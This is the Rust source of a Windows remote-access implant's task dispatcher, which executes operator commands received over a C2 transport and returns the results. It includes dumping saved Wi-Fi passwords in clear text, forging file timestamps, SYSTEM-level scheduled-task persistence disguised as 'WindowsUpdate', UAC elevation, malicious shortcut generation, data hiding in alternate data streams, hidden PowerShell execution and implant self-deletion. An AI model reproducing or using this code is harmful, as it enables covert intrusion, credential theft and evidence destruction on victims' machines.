#![allow(unused_imports, dead_code, non_snake_case)]
// Utility command dispatcher — supplementary task types for the Rust agent.

use std::process::Command;
use std::os::windows::process::CommandExt;
use crate::transport::{AgentTransport, TaskWire};
use base64::{engine::general_purpose::STANDARD, Engine as _};

use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, FILETIME,
};
use windows_sys::Win32::Storage::FileSystem::{
    GetLogicalDrives, GetDriveTypeW,
    CreateFileW, GetFileTime, SetFileTime,
    FindFirstStreamW, FindNextStreamW, FindClose, WIN32_FIND_STREAM_DATA,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};

// ── Win32 constant values (avoids type-alias ambiguity across features) ───────
const GENERIC_READ_V:               u32 = 0x80000000;
const FILE_WRITE_ATTRIBUTES_V:      u32 = 0x00000100;
const FILE_SHARE_READ_V:            u32 = 0x00000001;
const OPEN_EXISTING_V:              u32 = 3;
const FILE_FLAG_BACKUP_SEMANTICS_V: u32 = 0x02000000;

// ── Shell helpers (private in commands.rs — need local copies) ────────────────

fn shell(cmd: &str) -> String {
    match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

fn ps(script: &str) -> String {
    match Command::new("powershell.exe")
        .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
        .output()
    {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() { s.push_str(&e); }
            s
        }
        Err(e) => format!("[ps error: {}]", e),
    }
}

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain([0u16]).collect()
}

// ── Glob matching ─────────────────────────────────────────────────────────────

fn glob_match(pattern: &str, name: &str) -> bool {
    if pattern.is_empty() { return true; }
    if !pattern.contains('*') {
        return name.eq_ignore_ascii_case(pattern);
    }
    let nl = name.to_ascii_lowercase();
    let pl = pattern.to_ascii_lowercase();
    if pl == "*" { return true; }
    // suffix only: "*.txt"
    if let Some(stripped) = pl.strip_prefix('*') {
        if !stripped.contains('*') {
            return nl.ends_with(stripped);
        }
    }
    // prefix only: "foo*"
    if let Some(stripped) = pl.strip_suffix('*') {
        if !stripped.contains('*') {
            return nl.starts_with(stripped);
        }
    }
    // "pre*suf" — split on first star
    if let Some(pos) = pl.find('*') {
        let pre = &pl[..pos];
        let suf = &pl[pos + 1..];
        if !suf.contains('*') {
            return nl.starts_with(pre)
                && nl.ends_with(suf)
                && nl.len() >= pre.len() + suf.len();
        }
    }
    // last resort: name contains all non-star text
    nl.contains(pl.trim_matches('*'))
}

fn search_recursive(dir: &std::path::Path, pattern: &str, max: usize, out: &mut Vec<String>) {
    if out.len() >= max { return; }
    let rd = match std::fs::read_dir(dir) {
        Ok(r) => r,
        Err(_) => return,
    };
    for entry in rd.flatten() {
        if out.len() >= max { break; }
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().into_owned();
        if path.is_dir() {
            search_recursive(&path, pattern, max, out);
        } else if glob_match(pattern, &name) {
            out.push(path.to_string_lossy().into_owned());
        }
    }
}

fn search_files(root: &str, pattern: &str, max: usize) -> String {
    let mut results = Vec::new();
    search_recursive(std::path::Path::new(root), pattern, max, &mut results);
    if results.is_empty() { "[no matches]".into() } else { results.join("\n") }
}

// ── Logical drive enumeration ─────────────────────────────────────────────────

fn drives_list() -> String {
    unsafe {
        let mask = GetLogicalDrives();
        let mut out = String::new();
        for i in 0u32..26 {
            if mask & (1 << i) != 0 {
                let letter = (b'A' + i as u8) as char;
                let path_str = format!("{}:\\", letter);
                let path_w = wide(&path_str);
                let dt = GetDriveTypeW(path_w.as_ptr());
                let kind = match dt {
                    0 => "Unknown",
                    1 => "NoRoot",
                    2 => "Removable",
                    3 => "Fixed",
                    4 => "Remote",
                    5 => "CDROM",
                    6 => "RamDisk",
                    _ => "Unknown",
                };
                out.push_str(&format!("{}:\\ [{}]\n", letter, kind));
            }
        }
        if out.is_empty() { "[no drives]".into() } else { out }
    }
}

// ── Process list as JSON ──────────────────────────────────────────────────────

fn ps_json() -> String {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return "[{\"error\":\"snapshot failed\"}]".into();
        }
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        let mut entries: Vec<String> = Vec::new();
        if Process32First(snap, &mut pe) != 0 {
            loop {
                let end = pe.szExeFile.iter().position(|&b| b == 0)
                    .unwrap_or(pe.szExeFile.len());
                let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
                let name_j = name.replace('\\', "\\\\").replace('"', "\\\"");
                entries.push(format!(
                    "{{\"pid\":{},\"name\":\"{}\",\"ppid\":{}}}",
                    pe.th32ProcessID, name_j, pe.th32ParentProcessID
                ));
                if Process32Next(snap, &mut pe) == 0 { break; }
            }
        }
        CloseHandle(snap);
        format!("[{}]", entries.join(","))
    }
}

// ── Directory listing as JSON ─────────────────────────────────────────────────

fn ls_json(path: &str) -> String {
    let dir = if path.is_empty() {
        std::env::current_dir().unwrap_or_default().to_string_lossy().into_owned()
    } else {
        path.to_string()
    };
    match std::fs::read_dir(&dir) {
        Ok(rd) => {
            let items: Vec<String> = rd.flatten().map(|e| {
                let nm = e.file_name().to_string_lossy().into_owned();
                let nm_j = nm.replace('\\', "\\\\").replace('"', "\\\"");
                let is_dir = e.path().is_dir();
                let meta = e.metadata().ok();
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                let mtime = meta.as_ref()
                    .and_then(|m| m.modified().ok())
                    .map(|t| {
                        t.duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs()
                    })
                    .unwrap_or(0);
                format!(
                    "{{\"name\":\"{}\",\"size\":{},\"is_dir\":{},\"modified\":{}}}",
                    nm_j, size, is_dir, mtime
                )
            }).collect();
            format!("[{}]", items.join(","))
        }
        Err(e) => format!("[{{\"error\":\"{}\"}}]", e),
    }
}

// ── Timestamp helpers for TIMESTOMP ──────────────────────────────────────────

fn is_leap_year(y: i64) -> bool {
    (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0)
}

fn date_to_unix_secs(year: i64, month: i64, day: i64, hour: i64, min: i64, sec: i64) -> i64 {
    const DIM: [i64; 12] = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut days = 0i64;
    if year >= 1970 {
        for y in 1970..year { days += if is_leap_year(y) { 366 } else { 365 }; }
    } else {
        for y in year..1970 { days -= if is_leap_year(y) { 366 } else { 365 }; }
    }
    for m in 1..month {
        days += DIM[(m - 1) as usize];
        if m == 2 && is_leap_year(year) { days += 1; }
    }
    days += day - 1;
    days * 86400 + hour * 3600 + min * 60 + sec
}

fn datetime_to_filetime(s: &str) -> Option<FILETIME> {
    let s = s.trim();
    if s.len() < 19 { return None; }
    let year:  i64 = s[0..4].parse().ok()?;
    let month: i64 = s[5..7].parse().ok()?;
    let day:   i64 = s[8..10].parse().ok()?;
    let hour:  i64 = s[11..13].parse().ok()?;
    let min:   i64 = s[14..16].parse().ok()?;
    let sec:   i64 = s[17..19].parse().ok()?;
    let unix = date_to_unix_secs(year, month, day, hour, min, sec);
    let ft = (unix + 11_644_473_600i64) * 10_000_000i64;
    if ft < 0 { return None; }
    Some(FILETIME {
        dwLowDateTime:  (ft & 0xFFFF_FFFF) as u32,
        dwHighDateTime: ((ft >> 32) & 0xFFFF_FFFF) as u32,
    })
}

// ── TIMESTOMP implementation ──────────────────────────────────────────────────

unsafe fn timestomp(
    target: &str,
    ref_path: Option<&str>,
    created_s: Option<&str>,
    modified_s: Option<&str>,
) -> String {
    let (c, a, m) = if let Some(rp) = ref_path {
        let rw = wide(rp);
        let hr = CreateFileW(
            rw.as_ptr(), GENERIC_READ_V, FILE_SHARE_READ_V,
            std::ptr::null(), OPEN_EXISTING_V, FILE_FLAG_BACKUP_SEMANTICS_V, 0,
        );
        if hr == INVALID_HANDLE_VALUE {
            return format!("open ref failed (err {})", GetLastError());
        }
        let mut fc: FILETIME = std::mem::zeroed();
        let mut fa: FILETIME = std::mem::zeroed();
        let mut fm: FILETIME = std::mem::zeroed();
        GetFileTime(hr, &mut fc, &mut fa, &mut fm);
        CloseHandle(hr);
        (fc, fa, fm)
    } else {
        let zero = FILETIME { dwLowDateTime: 0, dwHighDateTime: 0 };
        let fc = created_s.and_then(|s| datetime_to_filetime(s)).unwrap_or(zero);
        let fm = modified_s.and_then(|s| datetime_to_filetime(s)).unwrap_or(fc);
        (fc, fc, fm)
    };

    let tw = wide(target);
    let ht = CreateFileW(
        tw.as_ptr(), FILE_WRITE_ATTRIBUTES_V, FILE_SHARE_READ_V,
        std::ptr::null(), OPEN_EXISTING_V, FILE_FLAG_BACKUP_SEMANTICS_V, 0,
    );
    if ht == INVALID_HANDLE_VALUE {
        return format!("open target failed (err {})", GetLastError());
    }
    let ok = SetFileTime(ht, &c, &a, &m);
    CloseHandle(ht);
    if ok == 0 { format!("SetFileTime failed (err {})", GetLastError()) }
    else { "[+] timestamps updated".to_string() }
}

// ── ADS stream listing ────────────────────────────────────────────────────────

unsafe fn ads_list_streams(path: &str) -> String {
    let pw = wide(path);
    let mut data: WIN32_FIND_STREAM_DATA = std::mem::zeroed();
    // FindStreamInfoStandard = 0i32
    let h = FindFirstStreamW(pw.as_ptr(), 0, &mut data as *mut WIN32_FIND_STREAM_DATA as *mut _, 0);
    if h == INVALID_HANDLE_VALUE {
        return format!("[error listing streams (err {})]", GetLastError());
    }
    let mut out = String::new();
    loop {
        let end = data.cStreamName.iter().position(|&c| c == 0)
            .unwrap_or(data.cStreamName.len());
        let name = String::from_utf16_lossy(&data.cStreamName[..end]);
        out.push_str(&format!("{} ({} bytes)\n", name, data.StreamSize));
        if FindNextStreamW(h, &mut data as *mut WIN32_FIND_STREAM_DATA as *mut _) == 0 {
            break;
        }
    }
    FindClose(h);
    if out.is_empty() { "[no alternate streams]".into() } else { out }
}

// ── Main dispatch ─────────────────────────────────────────────────────────────

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        // ── GETPID ────────────────────────────────────────────────────────────
        "GETPID" => {
            t.send_result(task.id, &std::process::id().to_string(), "");
            true
        }

        // ── DRIVES ───────────────────────────────────────────────────────────
        "DRIVES" => {
            t.send_result(task.id, &drives_list(), "");
            true
        }

        // ── NET_SHARES ───────────────────────────────────────────────────────
        "NET_SHARES" => {
            t.send_result(task.id, &shell("net share 2>&1"), "");
            true
        }

        // ── SEARCH ───────────────────────────────────────────────────────────
        "SEARCH" => {
            let (root, pattern, max) = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                let r = j.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\").to_string();
                let p = j.get("pattern").and_then(|v| v.as_str()).unwrap_or("*").to_string();
                let m = j.get("max_results").and_then(|v| v.as_u64()).unwrap_or(100) as usize;
                (r, p, m)
            } else {
                ("C:\\".to_string(), task.args.trim().to_string(), 100usize)
            };
            t.send_result(task.id, &search_files(&root, &pattern, max), "");
            true
        }

        // ── TIMESTOMP ────────────────────────────────────────────────────────
        "TIMESTOMP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let target = match j.get("path").and_then(|v| v.as_str()) {
                Some(p) if !p.is_empty() => p.to_string(),
                _ => {
                    t.send_result(task.id, "", "TIMESTOMP requires {\"path\":\"...\"}");
                    return true;
                }
            };
            let ref_path = j.get("ref").and_then(|v| v.as_str());
            let created  = j.get("created").and_then(|v| v.as_str());
            let modified = j.get("modified").and_then(|v| v.as_str());
            if ref_path.is_none() && created.is_none() && modified.is_none() {
                t.send_result(task.id, "", "TIMESTOMP requires 'ref' or 'created'/'modified'");
                return true;
            }
            let out = unsafe { timestomp(&target, ref_path, created, modified) };
            t.send_result(task.id, &out, "");
            true
        }

        // ── CLEANUP ──────────────────────────────────────────────────────────
        "CLEANUP" => {
            let exe = std::env::current_exe().unwrap_or_default();
            let exe_path = exe.to_string_lossy().into_owned();
            let cmd_str = format!("ping -n 2 127.0.0.1 > nul && del \"{}\" 2>nul", exe_path);
            t.send_result(task.id, "[+] cleanup scheduled", "");
            Command::new("cmd")
                .args(["/c", &cmd_str])
                .creation_flags(0x00000008) // DETACHED_PROCESS
                .spawn()
                .ok();
            std::process::exit(0);
        }

        // ── PS_JSON ──────────────────────────────────────────────────────────
        "PS_JSON" => {
            t.send_result(task.id, &ps_json(), "");
            true
        }

        // ── LS_JSON ──────────────────────────────────────────────────────────
        "LS_JSON" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            t.send_result(task.id, &ls_json(&path), "");
            true
        }

        // ── ELEVATE ──────────────────────────────────────────────────────────
        // Uses PowerShell Start-Process -Verb RunAs to avoid Win32_UI_Shell dependency
        "ELEVATE" => {
            let exe_path = if task.args.trim().is_empty() {
                std::env::current_exe()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .into_owned()
            } else {
                task.args.trim().to_string()
            };
            let escaped = exe_path.replace('\'', "''");
            let script = format!(
                "try {{ $p=Start-Process '{}' -Verb RunAs -PassThru -EA Stop; $p.Id }} \
                 catch {{ $_.Exception.Message }}",
                escaped
            );
            t.send_result(task.id, &ps(&script), "");
            true
        }

        // ── WIFI_CREDS ───────────────────────────────────────────────────────
        "WIFI_CREDS" => {
            let script = concat!(
                "(netsh wlan show profiles) -match 'All User Profile' -replace '.*: ','' | ",
                "ForEach-Object { $p=$_; ",
                "$k=(netsh wlan show profile name=$p key=clear | ",
                "Select-String 'Key Content') -replace '.*: ',''; ",
                "\"$p : $k\" }"
            );
            t.send_result(task.id, &ps(script), "");
            true
        }

        // ── GEN_LNK ──────────────────────────────────────────────────────────
        "GEN_LNK" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path   = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let target = j.get("target").and_then(|v| v.as_str())
                .unwrap_or("C:\\Windows\\System32\\cmd.exe");
            let args   = j.get("args").and_then(|v| v.as_str()).unwrap_or("");
            let icon   = j.get("icon").and_then(|v| v.as_str())
                .unwrap_or("C:\\Windows\\System32\\shell32.dll,0");
            if path.is_empty() {
                t.send_result(task.id, "", "GEN_LNK requires {\"path\":\"...\"}");
                return true;
            }
            let script = format!(
                "$s=(New-Object -COM WScript.Shell).CreateShortcut('{p}');\
                 $s.TargetPath='{t}';$s.Arguments='{a}';$s.IconLocation='{i}';$s.Save()",
                p = path.replace('\'', "''"),
                t = target.replace('\'', "''"),
                a = args.replace('\'', "''"),
                i = icon.replace('\'', "''"),
            );
            t.send_result(task.id, &ps(&script), "");
            true
        }

        // ── PERSIST_TASK ─────────────────────────────────────────────────────
        "PERSIST_TASK" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name     = j.get("name").and_then(|v| v.as_str()).unwrap_or("WindowsUpdate");
            let cmd      = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let user     = j.get("user").and_then(|v| v.as_str()).unwrap_or("SYSTEM");
            let trigger  = j.get("trigger").and_then(|v| v.as_str()).unwrap_or("ONLOGON");
            let interval = j.get("interval").and_then(|v| v.as_u64()).unwrap_or(0);
            if cmd.is_empty() {
                t.send_result(task.id, "", "PERSIST_TASK requires cmd");
                return true;
            }
            let sc = if trigger.eq_ignore_ascii_case("DAILY") && interval > 0 {
                format!("/sc MINUTE /mo {}", interval)
            } else if trigger.eq_ignore_ascii_case("ONSTART") {
                "/sc ONSTART".to_string()
            } else {
                "/sc ONLOGON".to_string()
            };
            let full = format!(
                "schtasks /create /tn \"{}\" /tr \"{}\" /ru {} {} /f 2>&1",
                name, cmd, user, sc
            );
            t.send_result(task.id, &shell(&full), "");
            true
        }

        // ── ADS_WRITE ────────────────────────────────────────────────────────
        "ADS_WRITE" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let data = j.get("data").and_then(|v| v.as_str()).unwrap_or("");
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_WRITE requires path");
                return true;
            }
            let bytes = match STANDARD.decode(data) {
                Ok(b) => b,
                Err(e) => {
                    t.send_result(task.id, "", &format!("base64 decode: {}", e));
                    return true;
                }
            };
            match std::fs::write(&path, &bytes) {
                Ok(_)  => t.send_result(task.id,
                    &format!("[+] wrote {} bytes to {}", bytes.len(), path), ""),
                Err(e) => t.send_result(task.id, "", &format!("write: {}", e)),
            }
            true
        }

        // ── ADS_READ ─────────────────────────────────────────────────────────
        "ADS_READ" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_READ requires path");
                return true;
            }
            match std::fs::read_to_string(&path) {
                Ok(s)  => t.send_result(task.id, &s, ""),
                Err(_) => match std::fs::read(&path) {
                    Ok(b)  => t.send_result(task.id, &STANDARD.encode(&b), ""),
                    Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
                },
            }
            true
        }

        // ── ADS_LIST ─────────────────────────────────────────────────────────
        "ADS_LIST" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_LIST requires path");
                return true;
            }
            let out = unsafe { ads_list_streams(&path) };
            t.send_result(task.id, &out, "");
            true
        }

        // ── ADS_DEL ──────────────────────────────────────────────────────────
        "ADS_DEL" => {
            let path = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string()
            } else {
                task.args.trim().to_string()
            };
            if path.is_empty() {
                t.send_result(task.id, "", "ADS_DEL requires path");
                return true;
            }
            match std::fs::remove_file(&path) {
                Ok(_)  => t.send_result(task.id, "[+] stream deleted", ""),
                Err(e) => t.send_result(task.id, "", &format!("delete: {}", e)),
            }
            true
        }

        _ => false,
    }
}
